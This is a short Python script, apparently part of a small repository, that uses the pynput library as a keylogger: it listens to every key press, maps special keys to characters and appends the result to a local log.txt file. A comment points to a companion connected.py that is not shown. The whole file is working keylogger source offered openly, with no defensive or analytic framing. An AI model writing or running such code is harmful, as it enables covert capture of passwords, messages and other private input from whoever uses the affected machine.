from pynput.keyboard import Listener

#this file is link with connected.py in this same repository

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'",'')
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.backspace':
        letter = '#'
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.shift_l':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    with open("log.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
print("\n")
